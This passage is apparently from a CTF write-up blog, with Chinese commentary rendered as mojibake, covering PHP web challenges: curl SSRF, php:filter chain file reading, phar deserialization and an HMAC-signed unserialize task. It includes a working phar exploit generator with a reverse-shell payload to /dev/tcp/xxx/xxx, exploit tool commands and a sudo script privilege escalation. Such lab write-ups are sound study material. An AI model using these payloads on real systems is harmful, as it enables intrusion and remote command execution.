class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åªæœ‰admin.phpæ˜¯å…³é”®çš„</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged_in&#x27;</span>] !== <span class="literal">true</span> || <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Please fill in the username and password&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$error_message</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$page_content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$url</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https:\/\//&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="variable">$error_message</span> = <span class="string">&#x27;Invalid URL, only https allowed&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        <span class="variable">$page_content</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$page_content</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$error_message</span> = <span class="string">&#x27;Failed to fetch the URL content&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$page_content</span>)) : <span class="meta">?&gt;</span></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&#x27;<span class="title">content</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">        &lt;?= <span class="title">nl2br</span>(<span class="title">htmlspecialchars</span>($<span class="title">page_content</span>)); ?&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>payloadæ€ç»´</p>
<ol>
<li>curl ssrfï¼Œä¼šå›æ˜¾ç›¸åº”çš„å†…å®¹</li>
<li>ç”±äºå…è®¸ä¸€æ¬¡è·³è½¬ï¼Œé‚£httpsä¸æ˜¯é—®é¢˜ï¼Œä½†æ˜¯é—®é¢˜æ˜¯https(ssl 55)</li>
<li>sstfä¸å¤ªç†Ÿç»ƒï¼Œæ‰¾æ‰¾èµ„æ–™<ol>
<li>[<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/10663]">https://xz.aliyun.com/news/10663]</a></li>
<li>å…¶ä¸­fastcgiå’Œphp-fpmï¼Œä¼¼ä¹æœ‰rceï¼Œå¯èƒ½æœ‰ç”¨ï¼Œ[<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/263342.html]">https://www.freebuf.com/articles/web/263342.html]</a></li>
<li>å…·ä½“å®ç°çœ‹å®˜æ–¹é¢˜è§£å¤ç°ä¸€æ³¢å˜»å˜»ï¼Œçªç„¶å¾ˆæ‡’[<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16077]">https://xz.aliyun.com/news/16077]</a></li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="å›¾ç‰‡æŸ¥çœ‹å™¨"><a href="#å›¾ç‰‡æŸ¥çœ‹å™¨" class="headerlink" title="å›¾ç‰‡æŸ¥çœ‹å™¨"></a>å›¾ç‰‡æŸ¥çœ‹å™¨</h2><h3 id="å›¾ç‰‡æŸ¥çœ‹å™¨-env"><a href="#å›¾ç‰‡æŸ¥çœ‹å™¨-env" class="headerlink" title="å›¾ç‰‡æŸ¥çœ‹å™¨ env"></a>å›¾ç‰‡æŸ¥çœ‹å™¨ env</h3><ol>
<li><code>docker build -t photo_checker .</code></li>
<li><code>docker run -d -p 5000:80 --name photo_checker photo_checker</code></li>
</ol>
<h3 id="å›¾ç‰‡æŸ¥çœ‹å™¨åˆ†æ"><a href="#å›¾ç‰‡æŸ¥çœ‹å™¨åˆ†æ" class="headerlink" title="å›¾ç‰‡æŸ¥çœ‹å™¨åˆ†æ"></a>å›¾ç‰‡æŸ¥çœ‹å™¨åˆ†æ</h3><ol>
<li><p>hI3t.php</p>
</li>
<li><p>æ€ä¹ˆè¯»æ–‡ä»¶å‘¢ï¼Ÿ</p>
<ol>
<li>æµ‹ä¿¡é“è¯•è¯•ï¼Œéœ€è¦php:filterï¼ŒçœŸå¯ä»¥</li>
<li>è¯»æ–‡ä»¶<ol>
<li><p>hI3t.php: <code>python3 filters_chain_oracle_exploit.py --target http://localhost:5000/chal13nge.php --file hI3t.php --parameter image_path</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgLy9nbyB4QDEucGhw</span><br><span class="line">b<span class="string">&#x27;&lt;?php //go x@1.php&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>x@1.phpï¼Œå†è¯»chal13nge.php(æœ‰é—®é¢˜ï¼Œfilter-chainè¯»å–æœ‰é™åˆ¶)</p>
<ol>
<li>pharååºåˆ—åŒ–ç›´æ¥åˆ°backdooræ‰§è¡Œ</li>
<li>ç›´æ¥æ‰“pharå°±å¥½äº†ï¼Œåæ­£æ— è§†php:&#x2F;&#x2F;filter&#x2F;</li>
</ol>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»¥ä¸‹æ˜¯class.phpæ–‡ä»¶å†…å®¹ï¼š</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// __toString()</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;hello &quot;</span> . <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot;&lt;/h3&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;chal13nge.php&#x27; class=&#x27;link-button&#x27;&gt;æ¬¢è¿æ¥åˆ°æŒ‘æˆ˜ï¼Œç‚¹å‡»æŒ‘æˆ˜&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;!--There&#x27;s something in the hI3t.php--&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¸»è¦æ–‡ä»¶å†…å®¹éƒ¨åˆ†æºç ï¼š</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//&lt;?php</span></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"><span class="comment">//include &quot;class.php&quot;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (isset($_POST[&#x27;image_path&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $image_path = $_POST[&#x27;image_path&#x27;];</span></span><br><span class="line"><span class="comment">//    echo &quot;The owner ID of the file is: &quot;;</span></span><br><span class="line"><span class="comment">//    echo fileowner($image_path) . &quot;&lt;br&gt;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//    echo &quot;æ–‡ä»¶ä¿¡æ¯å¦‚ä¸‹ï¼š&quot; . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//    $m = getimagesize($image_path);</span></span><br><span class="line"><span class="comment">//    if ($m) &#123;</span></span><br><span class="line"><span class="comment">//        echo &quot;å®½åº¦: &quot; . $m[0] . &quot; åƒç´ &lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//        echo &quot;é«˜åº¦: &quot; . $m[1] . &quot; åƒç´ &lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//        echo &quot;ç±»å‹: &quot; . $m[2] . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//        echo &quot;HTML å±æ€§: &quot; . $m[3] . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//        echo &quot;MIME ç±»å‹: &quot; . $m[&#x27;mime&#x27;] . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//    &#125; else &#123;</span></span><br><span class="line"><span class="comment">//        echo &quot;æ— æ³•è·å–å›¾åƒä¿¡æ¯ï¼Œè¯·ç¡®ä¿æ–‡ä»¶ä¸ºæœ‰æ•ˆçš„å›¾åƒæ ¼å¼ã€‚&quot;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
<li><p>æ‰“phar:phar.php</p>
<ol>
<li>è¿›å…¥åå°æ²¡æƒé™ï¼Œemm</li>
<li>suidä¸è¡Œï¼Œç”¨sudoå§ï¼Œæœ‰å¯ä»¥å…å¯†çš„è„šæœ¬ï¼Œå¯ä»¥ä¼ è„šæœ¬<ol>
<li>S1: <code>echo &quot;cat /root/flag&quot; &gt; /tmp/run.sh</code></li>
<li>S2: ç»™æƒé™: <code>chmod 777 /tmp/run.sh</code></li>
<li>S3: <code>sudo /tmp/rootscripts/check.sh &quot;/tmp&quot;</code>è¿è¡Œä¸€ä¸‹æ‹¿åˆ°flag</li>
</ol>
</li>
</ol>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ååºåˆ—åŒ–payloadæ„é€ </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// åå¼¹shell</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd=<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @unlink(&quot;phar.phar&quot;);</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">//è®¾ç½®stubï¼ŒGIF89aå¯ä»¥æ”¹æˆå…¶ä»–çš„å­—æ®µï¼Œç»•è¿‡æ–‡ä»¶å¤´æ£€éªŒï¼Œä½†å¿…é¡»ä»¥ __HALT_COMPILER(); ?\&gt; ç»“å°¾</span></span><br><span class="line"><span class="comment">// $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?\&gt;&quot;); </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="comment">//å°†ååºåˆ—åŒ–çš„å¯¹è±¡æ”¾å…¥è¯¥æ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();    </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//pharæœ¬è´¨ä¸Šæ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œæ‰€ä»¥è¦æ·»åŠ å‹ç¼©çš„æ–‡ä»¶å’Œæ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡å‘½åä¸ºgifå³å¯</span></span><br><span class="line"><span class="comment">// system(&quot;mv phar.phar phar.gif&quot;);</span></span><br><span class="line"><span class="comment">// system(&quot;cp phar.gif /home/kc1zs4/Code/CTF/&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;mv phar.phar phar.png&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cp phar.png /home/kc1zs4/Code/CTF/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$o</span>-&gt;cmd;</span><br><span class="line"><span class="comment">// æœ€åè¿è¡Œå‘½ä»¤: php -d phar.readonly=0 phar.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="n0ob-un4er"><a href="#n0ob-un4er" class="headerlink" title="n0ob_un4er"></a>n0ob_un4er</h2><h3 id="n0ob-un4er-env"><a href="#n0ob-un4er-env" class="headerlink" title="n0ob_un4er env"></a>n0ob_un4er env</h3><h3 id="n0ob-un4er-åˆ†æ"><a href="#n0ob-un4er-åˆ†æ" class="headerlink" title="n0ob_un4er åˆ†æ"></a>n0ob_un4er åˆ†æ</h3><ol>
<li><p>ç»™äº†index.php</p>
<ol>
<li><code>$SECRET</code>æ˜¯å‡çš„ï¼Œè¦è¯»æ–‡ä»¶ï¼Œåä¼ªé€ å°±æˆäº†ï¼Œè¦è¯»waf.phpå’Œreadflagï¼Ÿ<ol>
<li>php:filterå¯ä»¥çš„</li>
<li>filter-chainè¯»ä¸åˆ°æ–‡ä»¶ï¼Œè¿™é‡Œç›®å½•ç©¿è¶Šä¸è¡Œï¼Ÿ</li>
<li>ç›´æ¥æ‰“rceå¯ä»¥å—</li>
</ol>
</li>
<li>è¿™é‡Œå¦‚æœå¯ä»¥æ‰“pharå…¶å®ä¹Ÿå¯ä»¥ç›´æ¥è¿‡ï¼Œä½†æ˜¯æ²¡æœ‰å¾—ä¸Šä¼ ï¼Œæ˜¯å¦å¯ä»¥ç›´æ¥ä¼ ç½‘ç»œæµï¼Ÿ[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/17368982.html]%E6%9C%89%E8%BF%99%E7%A7%8D%E6%93%8D%E4%BD%9C">https://www.cnblogs.com/zpchcbd/p/17368982.html]æœ‰è¿™ç§æ“ä½œ</a><ol>
<li>æœ‰ç‚¹sadï¼Œdataè¢«è¿‡æ»¤äº†ï¼Œemm</li>
<li>çœ‹é¢˜è§£å˜»å˜»</li>
</ol>
</li>
</ol>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$SECRET</span>  = `/readsecret`;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$role</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$role</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;role = <span class="variable">$role</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// adminä»£ç æ‰§è¡Œ</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Admin can play everything!&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿™é‡Œæœ‰waf.phpçš„, copyå¯ä»¥filter-chainçš„</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>) &amp;&amp; @<span class="title function_ invoke__">copy</span>(<span class="variable">$filename</span> , <span class="string">&quot;/tmp/tmp.tmp&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Well done!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Copy failed.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User can play copy game.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_session</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// æ™®é€šçš„è®¾ç½®æ˜¯æ™®é€šçš„userï¼Œè¿™é‡Œå¯ä»¥æœ‰SECRETå¯ä»¥ä¼ªé€ å—</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">    <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>);    <span class="comment">// ç±»ä¼¼äºç­¾åï¼Ÿ</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;session-data&quot;</span>, <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s-----%s&quot;</span>, <span class="variable">$data</span>, <span class="variable">$hmac</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>];</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;-----&quot;</span>, <span class="variable">$data</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ä»¥ä¼ªé€ çš„è¯å°±æ²¡æœ‰é—®é¢˜</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$data</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$hmac</span>) || !<span class="title function_ invoke__">hash_equals</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>), <span class="variable">$hmac</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>); <span class="comment">// è¿™é‡Œå°±ä¼šç”Ÿæˆå¯¹è±¡äº†é˜¿</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$data</span>-&gt;role === <span class="string">&quot;user&quot;</span> )&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœæ˜¯userï¼Œåˆ™game</span></span><br><span class="line">        <span class="title function_ invoke__">game</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$data</span>-&gt;role === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// GETä¼ å…¥code</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">set_session</span>();</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">check_session</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="n0ob-un4er-å¤ç°"><a href="#n0ob-un4er-å¤ç°" class="headerlink" title="n0ob_un4er å¤ç°"></a>n0ob_un4er å¤ç°</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Litsasuk/articles/18593334">å®˜æ–¹é¢˜è§£</a></p>
</blockquote>
<ol>
